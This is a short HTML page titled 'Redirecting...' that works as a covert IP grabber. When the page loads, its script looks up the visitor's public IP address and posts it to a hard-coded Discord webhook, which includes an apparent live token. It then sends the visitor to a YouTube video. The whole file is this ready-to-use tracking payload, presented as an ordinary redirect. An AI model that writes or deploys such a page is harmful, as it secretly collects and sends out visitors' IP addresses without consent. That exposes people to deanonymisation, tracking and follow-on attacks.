<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <script>
    async function sendIPAndRedirect() {
      try {
        // 1. Get public IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // 2. Send to webhook
        await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `IP: ${ipData.ip}` })
        });

        // 3. Redirect to YouTube
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
      } catch (e) {

      }
    }

    sendIPAndRedirect();
  </script>
</head>
<body>
  <p></p>
</body>
</html>
